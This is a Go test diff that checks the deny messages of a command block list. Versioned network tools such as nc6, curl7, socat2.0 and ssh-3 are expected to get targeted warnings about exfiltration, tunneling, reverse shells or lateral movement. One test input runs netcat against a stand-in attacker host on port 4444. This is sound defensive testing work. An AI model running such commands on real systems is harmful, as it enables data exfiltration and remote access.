@@ -2571,13 +2571,14 @@ func TestDenyReason(t *testing.T) {
 		}
 	})
 
-	t.Run("versioned network tool does not say scripting interpreter", func(t *testing.T) {
-		// nc is denied as a network exfiltration tool, not as a scripting
-		// interpreter. nc6 is the IPv6 netcat variant on Debian/Ubuntu; it is
-		// blocked via version stripping (TrimRight("nc6","0123456789.") == "nc").
-		// The deny message must not call it a "scripting interpreter" since that
-		// label is misleading — nc is blocked to prevent data exfiltration, not
-		// because it can execute arbitrary code like bash or python.
+	t.Run("versioned netcat variant gets targeted tunneling message", func(t *testing.T) {
+		// nc6 is the IPv6 netcat variant on Debian/Ubuntu; it is blocked via
+		// version stripping (TrimRight("nc6","0123456789.") == "nc"). The deny
+		// message must explain the actual risk (raw TCP/UDP tunneling, reverse
+		// shell) and must NOT call it a "scripting interpreter" — nc is blocked
+		// for exfiltration risk, not because it executes arbitrary code like
+		// bash or python. This is the category-aware versioned message that
+		// mirrors the targeted message given to the unversioned "nc".
 		msg := denyReason(DefaultDeniedCommands, []string{"nc6", "attacker.example.com", "4444"})
 		if !strings.Contains(msg, "nc6") {
 			t.Errorf("expected message to name the versioned command; got: %s", msg)
@@ -2587,6 +2588,45 @@ func TestDenyReason(t *testing.T) {
 		}
 		if strings.Contains(msg, "scripting interpreter") {
 			t.Errorf("nc is a network tool, not a scripting interpreter — message must not say 'scripting interpreter'; got: %s", msg)
+		}
+		if !strings.Contains(msg, "tunnel") && !strings.Contains(msg, "remote shell") {
+			t.Errorf("nc6 message must explain tunneling/reverse-shell risk; got: %s", msg)
+		}
+	})
+	t.Run("versioned network tools get category-aware targeted messages", func(t *testing.T) {
+		// Versioned variants of network/transfer tools must get the same
+		// category-aware risk explanation as the unversioned command, not a
+		// generic "versioned variant" fallback that omits the actual reason
+		// for the block. This mirrors how versioned shell variants explain the
+		// -c bypass and versioned interpreters explain system/exec primitives.
+		for _, tc := range []struct {
+			cmd         string
+			wantContain string
+		}{
+			// download/exfiltration tools
+			{"curl7", "exfiltrate"},
+			{"wget2", "exfiltrate"},
+			// raw TCP/UDP tunneling tools
+			{"ncat3", "tunnel"},
+			{"socat2.0", "tunnel"},
+			// remote transfer / lateral movement tools
+			{"ssh-3", "lateral movement"},
+			{"scp-4", "lateral movement"},
+			{"rsync3", "lateral movement"},
+		} {
+			msg := denyReason(DefaultDeniedCommands, []string{tc.cmd, "arg"})
+			if !strings.Contains(msg, tc.cmd) {
+				t.Errorf("%s: expected message to name the versioned command; got: %s", tc.cmd, msg)
+			}
+			if !strings.Contains(msg, "versioned") {
+				t.Errorf("%s: expected message to mention 'versioned'; got: %s", tc.cmd, msg)
+			}
+			if !strings.Contains(msg, tc.wantContain) {
+				t.Errorf("%s: expected message to mention %q risk; got: %s", tc.cmd, tc.wantContain, msg)
+			}
+			if strings.Contains(msg, "destructive or privileged") {
+				t.Errorf("%s: expected message NOT to use generic phrasing; got: %s", tc.cmd, msg)
+			}
 		}
 	})
 
